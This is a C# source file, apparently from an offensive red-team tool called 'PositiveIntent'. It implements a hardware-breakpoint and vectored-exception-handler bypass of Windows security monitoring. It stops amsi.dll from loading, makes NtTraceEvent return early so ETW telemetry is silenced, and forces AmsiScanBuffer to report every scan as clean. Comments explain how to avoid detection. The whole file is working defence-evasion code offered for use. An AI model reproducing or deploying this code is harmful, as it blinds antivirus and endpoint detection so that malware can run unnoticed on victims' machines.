using PositiveIntent.DINV;
using System;
using System.Runtime.InteropServices;

namespace PositiveIntent
{
    class BreakpointHelper
    {
        const uint EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
        const uint EXCEPTION_CONTINUE_SEARCH = 0x0;
        const uint EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        const uint EXCEPTION_SINGLE_STEP = 0x80000004;
        const uint CONTEXT_AMD64 = 0x00100000;
        const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10; // 0x00100010
        const uint CONTEXT_INTEGER = CONTEXT_AMD64 | 0x2;          // 0x00100002
        const uint CONTEXT_CONTROL = CONTEXT_AMD64 | 0x1;          // 0x00100001
        const uint STATUS_DLL_NOT_FOUND = 0xc0000135;

        static bool breakpointsSet = false;
        static bool clearRequested = false;
        static IntPtr vehHandle = IntPtr.Zero;

        [ThreadStatic]
        static bool _inDr0Handler;

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_POINTERS
        {
            public IntPtr ExceptionRecord;
            public IntPtr ContextRecord;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
            public UIntPtr[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15;
            public ulong Rip;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;        // bytes, not chars
            public ushort MaximumLength;
            public IntPtr Buffer;        // PWSTR
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint RemoveVectoredExceptionHandlerDelegate(IntPtr handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint VectoredExceptionHandler(ref EXCEPTION_POINTERS exceptionInfo);
        static VectoredExceptionHandler handlerDelegate = new VectoredExceptionHandler(VEHCallback);

        // Consider removing the HWBPs for long-running processes to avoid detection from GetThreadContext
        static uint VEHCallback(ref EXCEPTION_POINTERS exceptionInfo)
        {
            EXCEPTION_RECORD exRecord = Marshal.PtrToStructure<EXCEPTION_RECORD>(exceptionInfo.ExceptionRecord);
            CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);

            // Catch division by zero and set hardware breakpoint
            if (exRecord.ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)
            {
                if (!breakpointsSet)
                {
                    // Get target function address
                    IntPtr ntdllBaseAddress = Generic.GetLoadedModuleAddress("ntdll.dll");
                    IntPtr amsiBaseAddress = Generic.GetLoadedModuleAddress("amsi.dll");
                    IntPtr ldrLoadDll = Generic.GetExportAddress(ntdllBaseAddress, "LdrLoadDll");
                    IntPtr ntTraceEvent = Generic.GetExportAddress(ntdllBaseAddress, "NtTraceEvent");

                    // Set hardware breakpoints
                    context.Dr0 = (ulong)ldrLoadDll;
                    context.Dr1 = (ulong)ntTraceEvent;

                    // Edge case to account for reflective loading e.g. in PowerShell where amsi.dll is already loaded
                    if (amsiBaseAddress != IntPtr.Zero)
                    {
                        IntPtr amsiScanBuffer = Generic.GetExportAddress(amsiBaseAddress, "AmsiScanBuffer");
                        context.Dr2 = (ulong)amsiScanBuffer;
                    }

                    // Configure Dr7
                    // Set bits 0 (L0), 2 (L1), and 4 (L2) to 1 to enable enable Dr0, Dr1, Dr2 debug registers
                    context.Dr7 = 0x1 | 0x4 | 0x10;

                    // Mark that we want debug registers updated
                    context.ContextFlags |= CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL | CONTEXT_INTEGER;

                    // Write modified context back
                    Marshal.StructureToPtr(context, exceptionInfo.ContextRecord, false);

                    breakpointsSet = true;
                }
                else if (clearRequested)
                {
                    context.Dr0 = 0; context.Dr1 = 0; context.Dr2 = 0;
                    context.Dr6 = 0; context.Dr7 = 0;
                    context.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
                    Marshal.StructureToPtr(context, exceptionInfo.ContextRecord, false);
                    breakpointsSet = false;
                }
                return EXCEPTION_CONTINUE_SEARCH;
            }

            // Handle hardware breakpoint hits
            if (exRecord.ExceptionCode == EXCEPTION_SINGLE_STEP && breakpointsSet)
            {
                if ((context.Dr6 & 0x1) != 0) // Dr0: LdrLoadDll
                {
                    // Guard against re-entry: Marshal/CLR calls inside this block can themselves
                    // invoke NtTraceEvent, which re-fires Dr1 and recursively enters the VEH.
                    // The string-comparison path is the only managed-heavy section; if we're
                    // already inside it, skip the check and let LdrLoadDll run normally.
                    if (!_inDr0Handler)
                    {
                        _inDr0Handler = true;
                        try
                        {
                            var unicodeStringPtr = new IntPtr((long)context.R8);
                            if (unicodeStringPtr != IntPtr.Zero)
                            {
                                var us = Marshal.PtrToStructure<UNICODE_STRING>(unicodeStringPtr);
                                if (us.Buffer != IntPtr.Zero && us.Length > 0)
                                {
                                    string dllName = Marshal.PtrToStringUni(us.Buffer, us.Length / sizeof(char));
                                    if (dllName.EndsWith("amsi.dll", StringComparison.OrdinalIgnoreCase))
                                    {
                                        // Spoof return: skip the load entirely
                                        ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                                        context.Rip = returnAddress;
                                        context.Rsp += 8;
                                        context.Rax = STATUS_DLL_NOT_FOUND;
                                    }
                                }
                            }
                        }
                        finally
                        {
                            _inDr0Handler = false;
                        }
                    }
                }

                else if ((context.Dr6 & 0x2) != 0) // Dr1: NtTraceEvent
                {
                    // Simulate a 'ret' instruction
                    ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                    context.Rip = returnAddress;
                    context.Rsp += 8;
                    context.Rax = 0x0; // ERROR_SUCCESS
                }

                else if ((context.Dr6 & 0x4) != 0) // Dr2: AmsiScanBuffer
                {
                    // Read the AMSI_RESULT* pointer from the stack (6th argument at rsp+0x30)
                    IntPtr resultPtr = Marshal.ReadIntPtr(new IntPtr((long)context.Rsp + 0x30));
                    if (resultPtr != IntPtr.Zero)
                    {
                        Marshal.WriteInt32(resultPtr, 0); // AMSI_RESULT_CLEAN = 0
                    }
                    // Simulate a 'ret' instruction
                    ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                    context.Rip = returnAddress;
                    context.Rsp += 8;
                    context.Rax = 0x0; // S_OK
                }

                else
                {
                    // SINGLE_STEP not from one of our HWBPs (e.g. TF-based step from CLR internals).
                    // Don't consume it — pass to the next handler.
                    return EXCEPTION_CONTINUE_SEARCH;
                }

                // Clear Dr6 status register
                context.Dr6 = 0;

                // Set the Resume Flag (RF) in EFLAGS to prevent re-triggering
                // RF is bit 16 (0x10000) - tells CPU to ignore breakpoints for one instruction
                context.EFlags |= 0x10000;

                // Mark that we want debug registers updated
                context.ContextFlags |= CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL | CONTEXT_INTEGER;

                Marshal.StructureToPtr(context, exceptionInfo.ContextRecord, false);

                return EXCEPTION_CONTINUE_EXECUTION;
            }
            // Exception not a SINGLE_STEP
            // Don't consume it — pass to the next handler.
            return EXCEPTION_CONTINUE_SEARCH;
        }

        public static void Teardown()
        {
            clearRequested = true;

            // intentionally trigger VEH again to clear HWBPs
            try { int x = 1, y = 0, _ = x / y; } catch (DivideByZeroException) { }

            // As long as Dr0-Dr2, Dr7, and Dr6 are cleared, it doesn't seem to matter if we remove the VEH or not. One less Win32 API call is better than more, so commenting this out for now.
            /*if (vehHandle != IntPtr.Zero)
            {
                object[] parameters = new object[] { vehHandle };
                Generic.DynamicApiInvoke<uint>("kernel32.dll", "RemoveVectoredExceptionHandler", typeof(RemoveVectoredExceptionHandlerDelegate), ref parameters);
                vehHandle = IntPtr.Zero;
            }*/
        }

        public static void SetupHandler()
        {
            object[] parameters = new object[] { (uint)1, Marshal.GetFunctionPointerForDelegate(handlerDelegate) };
            vehHandle = Generic.DynamicApiInvoke<IntPtr>("kernel32.dll", "AddVectoredExceptionHandler", typeof(AddVectoredExceptionHandler), ref parameters);
        }
    }
}